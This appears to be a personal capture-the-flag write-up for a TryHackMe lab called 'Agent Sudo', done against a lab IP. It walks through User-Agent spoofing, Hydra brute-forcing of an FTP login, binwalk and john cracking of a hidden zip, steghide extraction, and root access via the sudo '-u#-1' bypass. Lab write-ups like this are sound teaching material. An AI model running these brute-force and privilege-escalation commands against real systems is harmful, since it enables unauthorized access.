# what I learn
- binwalk
# enumerate
- 21/tcp open  ftp
- 22/tcp open  ssh
- 80/tcp open  http
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```
change user-agent: to R (I used burp suite to capture my request -> edit -> forward it)
```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```
25 employees? like alphabet? so let start from A
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```
We know that agent C's (chirs) password is weak, and he have something to do with agent J. I try to get page for `user agent: J` not thing pop up..


We know that Chris pass word is weak, let use Hydra to crack FTP.
```console
kali@kali:~$ hydra -f -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp
```
now log in as Chris
```console
kali@kali:~/THM/agent$ ftp $IP
Connected to 10.10.142.53.
220 (vsFTPd 3.0.3)
Name (10.10.142.53:kali): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```
get all the files !!
```console
kali@kali:~/THM/agent$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
as the message said agent J's login password is somehow stored in the **fake picture**. So I have no choice than try to brute force steghide on the pictures. I found a simple bash script [here](https://gist.github.com/itsecurityco/503970852ac47cd6a3b356590d824a2c) which can be use to brute forcing steghid. copy the script and make it executable (``chmod +x``). Now run the script.

```console
kali@kali:~/THM/agent$ ../../script/steghidebf.sh cutie.png /usr/share/wordlists/rockyou.txt 
Steghide Bruteforce (c) 2017 by Juan Escobar
stegofile: cutie.png
wordlist:  /usr/share/wordlists/rockyou.txt

[+] Information obtained with passphrase: '123456'
steghide: the file format of the file "cutie.png" is not supported.
```
it didnt works... why?
```console
kali@kali:~/THM/agent$ file cutie.png 
cutie.png: PNG image data, 528 x 528, 8-bit colormap, non-interlaced
kali@kali:~/THM/agent$ binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
ahaaa that what Chris mean with **fake picture**, this file included a zip file. let use `binwalk` to extrack the hidden files.
```console
kali@kali:~/THM/agent$ binwalk -e cutie.png 
kali@kali:~/THM/agent$ ls
cute-alien.jpg  cutie.png  _cutie.png.extracted  To_agentJ.txt
kali@kali:~/THM/agent$ ls _cutie.png.extracted/
365  365.zlib  8702.zip  To_agentR.txt
```
we need password to be able to extract the *.zip*. we will use `zip2john` to convert it to hash format then use `john` to crack it
```console
root@kali:~# zip2john /home/kali/THM/agent/_cutie.png.extracted/8702.zip > /home/kali/THM/agent/zip2john.txt
root@kali:~# john -wordlist=/usr/share/wordlists/rockyou.txt /home/kali/THM/agent/zip2john.txt
```
I got the password and tried to extract the zip it with `xarchiver` but got error. let try with 7z
```console
kali@kali:~/THM/agent/_cutie.png.extracted$ 7z e 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-7820HQ CPU @ 2.90GHz (906E9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 08:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 08:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? A

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
kali@kali:~/THM/agent/_cutie.png.extracted$ ls
 365   365.zlib   8702  '8702-(1)'   8702.zip   To_agentR.txt
kali@kali:~/THM/agent/_cutie.png.extracted$ cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
use CyberChef magic `QXJlYTUx` -> bas64 -> <password>
```console
kali@kali:~/THM/agent$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
kali@kali:~/THM/agent$ cat message.txt 
Hi <username>,

Glad you find this message. Your login password is <password>

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
ssh to the server and get the flag


to another task, you need to use `scp` or `python` toget the picture and image search it in google, (check hint if ya stuck).
# root
sine the room call `Agent sudo`, so far we didnt do anything with sudo yet. and I know a CVE for sudo which effect sudo versions < **1.8.28**. let check version:
```console
james@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```
BING GO! read more about it [here](sudovulnsbypass.md). let exploit it:
```console
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~#
```
